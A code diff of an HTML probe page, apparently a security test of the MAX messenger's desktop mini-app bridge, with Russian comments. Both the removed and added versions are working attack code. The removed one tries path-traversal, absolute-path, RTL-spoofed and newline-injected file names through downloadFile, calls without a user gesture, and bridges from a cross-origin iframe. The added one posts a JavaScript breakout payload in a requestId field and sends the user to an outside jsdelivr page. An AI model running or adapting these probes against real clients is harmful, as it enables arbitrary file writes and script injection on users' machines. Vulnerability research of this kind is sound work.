@@ -1,145 +1,39 @@
 <!doctype html>
 <html lang="ru">
-<head>
-<meta charset="utf-8">
-<title>MAX G1 probe</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<style>
-  body{font:13px/1.45 ui-monospace,Menlo,monospace;margin:16px;max-width:760px}
-  button{display:block;width:100%;margin:4px 0;padding:8px;text-align:left;cursor:pointer;
-         font:inherit;background:#f4f4f4;border:1px solid #ccc;border-radius:4px}
-  button:hover{background:#e8f0fe}
-  #log{white-space:pre-wrap;background:#111;color:#9f9;padding:10px;margin-top:12px;
-       border-radius:4px;max-height:340px;overflow:auto}
-  .warn{color:#b00}
-</style>
+<head><meta charset="utf-8"><title>T</title>
+<style>body{font:15px monospace;margin:12px}
+button{width:100%;padding:16px;font:inherit;font-size:17px;font-weight:bold;background:#ffd;border:2px solid #a80;border-radius:8px;cursor:pointer;margin-top:10px}
+#log{white-space:pre-wrap;background:#111;color:#9f9;padding:10px;margin-top:10px;border-radius:4px;max-height:320px;overflow:auto}</style>
 </head>
 <body>
-<h3>MAX desktop — Г1 probe (downloadFile path)</h3>
-<div id="meta"></div>
-<div id="buttons"></div>
-<div id="log">log ready</div>
-
+<div>Жди 4 сек (тест пойдёт сам), потом скопируй лог и жми кнопку внизу.</div>
+<div id="log">ready</div>
+<button id="next">ДАЛЕЕ — на чужую страницу (там нажми Accept в диалоге телефона)</button>
 <script src="https://st.max.ru/js/max-web-app.js"></script>
-<script>
-// ==== конфиг ====
-// PROBE_URL — https-ссылка на probe.txt (см. комментарии в G1-REPRO.md)
-const PROBE_URL = new URL('probe.txt', location.href).href;
-
-// ==== r16 autorun: RUN из ?auto=<RUN>, либо случайный ====
-const qParams = new URLSearchParams(location.search);
-const autoParam = qParams.get('auto');
-let startParam = null;
-try { startParam = window.WebApp && WebApp.initDataUnsafe && WebApp.initDataUnsafe.start_param || null; } catch(e){}
-
-let RUN = crypto.randomUUID ? crypto.randomUUID().slice(0,8) : Math.random().toString(36).slice(2,10);
-const wspParam = qParams.get('WebAppStartParam');
-const AUTO = (autoParam !== null) || (wspParam !== null) || startParam === 'auto';
-if (autoParam && autoParam !== 'auto') RUN = autoParam.slice(0,16);
-document.title = "R:"+RUN+(AUTO?"-auto":"-manual");
-
-// ==== лог + перехват native→JS ответов ====
-const logEl = document.getElementById('log');
-function persistLog(){ try { localStorage.setItem("g1log:"+RUN, logEl.textContent); } catch(e){} }
-function log(...a){ const s = a.map(x => typeof x==='object'?JSON.stringify(x):String(x)).join(' ';
-  logEl.textContent += "\n[" + new Date().toTimeString().slice(0,8) + "] " + s; persistLog(); }
-log("probe run:", RUN, "| auto:", AUTO, "| autoParam:", autoParam, "| start_param:", startParam,
-    "| platform:", window.WebApp && WebApp.platform, "| version:", window.WebApp && WebApp.version);
-
-// native вызывает window.WebApp.sendEvent(name, dataJson) — оборачиваем для журнала
-function wrapSendEvent(){
-  if (window.WebApp && typeof WebApp.sendEvent === 'function' && !WebApp.__wrapped){
-    const orig = WebApp.sendEvent.bind(WebApp);
-    WebApp.sendEvent = function(name, data){ log("<= sendEvent", name, data); document.title = "R:"+RUN+":<="+String(name).slice(0,24); return orig(name, data); };
-    WebApp.__wrapped = true; return true;
-  } return false;
+<script>(() => {
+const RUN=(crypto.randomUUID?crypto.randomUUID().slice(0,8):Math.random().toString(36).slice(2,10));
+const logEl=document.getElementById('log');
+function log(...a){ logEl.textContent += "\n["+new Date().toTimeString().slice(0,8)+"] "+a.map(x=>String(x)).join(" "); }
+log("run:",RUN);
+function ensureRecv(){
+  if(!window.WebApp) window.WebApp={};
+  if(typeof window.WebApp.sendEvent!=='function' || window.WebApp.__ours){ 
+    window.WebApp.sendEvent=function(n,d){ log("<=",n,d); if(window.__deliver) window.__deliver(n,d); };
+    window.WebApp.__ours=1;
+  }
 }
-let weTry = 0; const weTimer = setInterval(()=>{ if(wrapSendEvent() || ++weTry>40) clearInterval(weTimer); }, 250);
-
-// ==== два способа вызвать натив ====
-function viaSdk(url, name){ // документированный путь (CDN-скрипт)
-  return WebApp.downloadFile(url, name);
-}
-function viaRaw(url, name){ // прямой пост в нативный обработчик (то же, что делает SDK)
-  const payload = "WebAppDownloadFile:" + JSON.stringify({ url: url, file_name: name });
-  log("=> raw", payload);
-  window.webkit.messageHandlers.EventHandler.postMessage(payload);
-}
-function callCase(c){
-  log("=> SDK downloadFile", c.id, c.name);
-  try { const p = viaSdk(PROBE_URL, c.name); if(p&&p.catch) p.catch(e=>log("reject", c.id, e)); }
-  catch(e){ log("SDK throw:", c.id, e.message, "-> fallback raw"); viaRaw(PROBE_URL, c.name); }
-  document.title = "R:"+RUN+":"+c.id;
-}
-
-// ==== матрица кейсов ====
-const CASES = [
- {id:"C1", label:"baseline: probe-<run>.txt (ожидание ~/Downloads)", name:"probe-"+RUN+".txt"},
- {id:"C2", label:"traversal 1: ../probe-up-<run>.txt (ожидание ~/)", name:"../probe-up-"+RUN+".txt"},
- {id:"C3", label:"traversal 4: ../../../../../tmp/probe-tmp-<run>.txt", name:"../../../../../../../tmp/probe-tmp-"+RUN+".txt"},
- {id:"C4", label:"absolute: /tmp/probe-abs-<run>.txt", name:"/tmp/probe-abs-"+RUN+".txt"},
- {id:"C5", label:"home: ~/probe-home-<run>.txt", name:"~/probe-home-"+RUN+".txt"},
- {id:"C6", label:"nested dir: sub/probe-nest-<run>.txt", name:"sub/probe-nest-"+RUN+".txt"},
- {id:"C7", label:"unicode RTL+символы (спуфинг диалога)", name:"\u202Etxt."+RUN+"\u202Cgnp-3lorp\u202E.."},
- {id:"C8", label:"newline (инъекция текста диалога)", name:"probe-nl-"+RUN+".txt\n\nSAVED-TO:-/tmp\n.txt"},
-];
-const box = document.getElementById('buttons');
-CASES.forEach(c=>{
-  // через SDK (клик = user gesture, окно 3000 мс)
-  const b = document.createElement('button');
-  b.textContent = c.id+" [SDK, click] "+c.label;
-  b.onclick = ()=>callCase(c);
-  box.appendChild(b);
-  // тот же кейс raw-путём (мост напрямую), отдельной кнопкой
-  const r = document.createElement('button');
-  r.textContent = c.id+" [RAW, click] "+c.label;
-  r.onclick = ()=>{ try { viaRaw(PROBE_URL, c.name); } catch(e){ log("raw throw:", e.message); } };
-  box.appendChild(r);
-});
-
-// C9: БЕЗ жеста — авто-вызов через 1.5 c после загрузки (проверка, жив ли gesture-гейт на macOS)
+ensureRecv();
+const t=setInterval(()=>{ if(window.WebApp && !window.WebApp.__ours && typeof WebApp.sendEvent==='function'){
+  const o=WebApp.sendEvent.bind(WebApp);
+  WebApp.sendEvent=function(n,d){ log("<=",n,d); return o(n,d); }; WebApp.__ours=1; clearInterval(t); } },200);
 setTimeout(()=>{
-  const name = "probe-nogesture-"+RUN+".txt";
-  log("=> NO-GESTURE auto call", name);
-  document.title = "R:"+RUN+":C9";
-  try { const p = viaSdk(PROBE_URL, name); if(p&&p.catch) p.catch(e=>log("no-gesture reject", e)); }
-  catch(e){ log("no-gesture SDK throw:", e.message, "-> raw"); viaRaw(PROBE_URL, name); }
-}, 1500);
-
-// ==== r16 AUTORUN: все кейсы C1–C8 без жеста, по одному через 400 мс ====
-if (AUTO) {
-  setTimeout(()=>{
-    log("AUTORUN start (auto=", autoParam, "start_param=", startParam, ")");
-    CASES.forEach((c,i)=>{
-      setTimeout(()=>callCase(c), 400*i);
-    });
-    setTimeout(()=>{ log("AUTORUN done"); document.title = "R:"+RUN+":AUTORUN-DONE"; }, 400*CASES.length+300);
-  }, 1500);
-}
-
-// C10: blob-путь (другая нативная ветка — WKDownloadDelegate/Content-Disposition)
-fetch(PROBE_URL).then(r=>r.blob()).then(b=>{
-  const u = URL.createObjectURL(b);
-  const btn = document.createElement('button');
-  btn.textContent = "C10 [blob] baseline-имя через blob: URL";
-  btn.onclick = ()=>{ const name="probe-blob-"+RUN+".txt"; log("=> blob", name);
-    try { const p = viaSdk(u, name); if(p&&p.catch) p.catch(e=>log("blob reject", e)); }
-    catch(e){ log("blob SDK throw:", e.message); } };
-  box.appendChild(btn);
-}).catch(e=>log("blob fetch fail:", e.message));
-
-// C11: Г3 — мост из iframe чужого origin (контролируемая заглушка не нужна:
-// сам факт, что обработчик ответит чужому фрейму, виден по реакции sendEvent)
-(function(){
-  const f = document.createElement('iframe');
-  f.style.cssText = "width:100%;height:60px;border:1px dashed #999";
-  f.src = "https://example.com/";
-  document.body.appendChild(f);
-  log("iframe example.com добавлен; изнутри него мост недоступен нам — но нативную реакцию смотрим в логе/Inspector");
-})();
-
-document.getElementById('meta').innerHTML =
-  "run: <b>"+RUN+"</b> (auto="+AUTO+") — зафиксируй этот идентификатор в скриншотах. Ожидаемые места записи смотри в G1-REPRO.md.";
-</script>
-</body>
-</html>
+  log("=> self-test: raw GetKey с breakout-payload из ГЛАВНОГО фрейма");
+  try{ window.webkit.messageHandlers.EventHandler.postMessage('WebAppDeviceStorageGetKey:'+JSON.stringify({requestId:');document.title="PWNED-MAIN";window.__pwn=1;//',key:'k'+RUN})); }
+  catch(e){ log("throw:",e.message); }
+  setTimeout(()=>log("self-test: title=",document.title,"__pwn=",window.__pwn),2500);
+},2000);
+let lastTitle=document.title;
+setInterval(()=>{ if(document.title!==lastTitle){ lastTitle=document.title; log("TITLE:",lastTitle); } },300);
+document.getElementById('next').onclick=()=>setTimeout(()=>{ location.href='https://cdn.jsdelivr.net/gh/nbafan00/dl-check@1d9c5ac9bcf3d18fe3f983b9b3af20e1bdda8c13/child.xhtml'; },300);
+})();</script>
+</body></html>
